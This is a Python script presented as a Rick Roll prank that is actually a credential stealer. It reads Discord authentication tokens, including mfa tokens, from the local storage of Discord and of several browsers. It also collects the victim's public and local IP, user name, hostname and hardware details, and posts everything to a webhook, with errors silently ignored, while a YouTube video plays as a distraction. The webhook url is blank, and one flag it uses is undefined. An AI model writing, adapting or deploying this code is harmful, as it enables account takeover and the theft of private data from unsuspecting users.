import requests
from requests import get
import socket
from urllib.request import Request, urlopen
import json
import re
import platform
import os
import psutil
import cpuinfo
import GPUtil
import time

print('Script made by frame')
time.sleep(0.1)
print('Script made by frame')
time.sleep(0.1)
print('Script made by frame')
time.sleep(0.1)
print('Script made by frame')
time.sleep(0.1)
print('Script made by frame')
os.system('cls')
print('''
Never gonna give you up
Never gonna let you down
Never gonna run around and desert you
Nеver gonna make you cry
Nevеr gonna say goodbye
Never gonna tell a lie and hurt you''')
time.sleep(1)

hostname = socket.gethostname()
user = os.getlogin()
local_ip = socket.gethostbyname(hostname)
ip = get('https://api.ipify.org').text
uname = platform.uname()
mem_info = psutil.virtual_memory()
disk_info = psutil.disk_usage('/')
cpu_info = cpuinfo.get_cpu_info()
gpus = GPUtil.getGPUs()

url = ""

def find_tokens(path):
    path += '\\Local Storage\\leveldb'
    tokens = []

    for file_name in os.listdir(path):
        if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
            continue

        for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
            for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.([\w-]{84})'):
                for token in re.findall(regex, line):
                    tokens.append(token)
    return tokens

def main():
    local = os.getenv('LOCALAPPDATA')
    roaming = os.getenv('APPDATA')

    paths = {
        'Discord': roaming + '\\Discord',
        'Discord Canary': roaming + '\\discordcanary',
        'Discord PTB': roaming + '\\discordptb',
        'Google Chrome': local + '\\Google\\Chrome\\User Data\\Default',
        'Opera': roaming + '\\Opera Software\\Opera Stable',
        'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
        'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default'
    }

    message = '@everyone' if PING_ME else ''

    for platform_name, path in paths.items():
        if not os.path.exists(path):
            continue

        message += f'\n** {platform_name} Token**\n```\n'

        tokens = find_tokens(path)

        if len(tokens) > 0:
            for token in tokens:
                message += f'{token}\n'
        else:
            message += 'No tokens found.\n'

        message += '```'

    headers = {
        'username' : 'Rick Astley',
        'Content-Type': 'application/json',
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11',
    }

    payload = json.dumps({'content': message})

    try:
        req = Request(url, data=payload.encode(), headers=headers)
        urlopen(req)
    except:
        pass

data = {
    "content" : "",
    "username" : "Rick Astley",
    "avatar_url": "https://www.thetimes.co.uk/imageserver/image/%2Fmethode%2Fsundaytimes%2Fprod%2Fweb%2Fbin%2Fe6496bba-3356-11ec-91da-063c6e372e74.jpg?crop=2667%2C1500%2C0%2C0"
}

gpu_info = "\n".join([f"**GPU {i+1}**: {gpu.name}, Memory: {gpu.memoryTotal} MB, GPU Usage: {gpu.load * 100:.2f}%" for i, gpu in enumerate(gpus)])

cpu_info_str = "\n".join([f"**{key}**: {value}" for key, value in cpu_info.items()])

data["embeds"] = [
    {
        "description" : (
            f"**💻Ipv4: **{ip} \n**💻Local ip: ** {local_ip}\n**💻Hostname: **{hostname}\n**💻Pc User: ** {user} \n\n **:mirror_ball:System**: {uname.system}\n **:pager:Machine**: {uname.machine}\n **:gear:Processor**: {uname.processor}"
            f"\n\n **:brain:Total Memory**: {mem_info.total / (1024 ** 3):.2f} GB\n **:card_box:Available Memory**: {mem_info.available / (1024 ** 3):.2f} GB\n **:bar_chart:Memory Usage**: {mem_info.percent}%"
            f"\n\n **:floppy_disk:Total Disk Space**: {disk_info.total / (1024 ** 3):.2f} GB\n **:cd:Available Disk Space**: {disk_info.free / (1024 ** 3):.2f} GB\n **:bar_chart:Disk Usage**: {disk_info.percent}%"
            f"\n\n **:gear:CPU Info**:\n {cpu_info_str}"
            f"\n\n**:man_detective:GPU Info**:\n{gpu_info}"
        ),
        "title" : "RICK ROLLED",
        "color" : 65280
    }
]
os.system("start https://www.youtube.com/watch?v=xvFZjo5PgG0")
result = requests.post(url, json = data)
main()
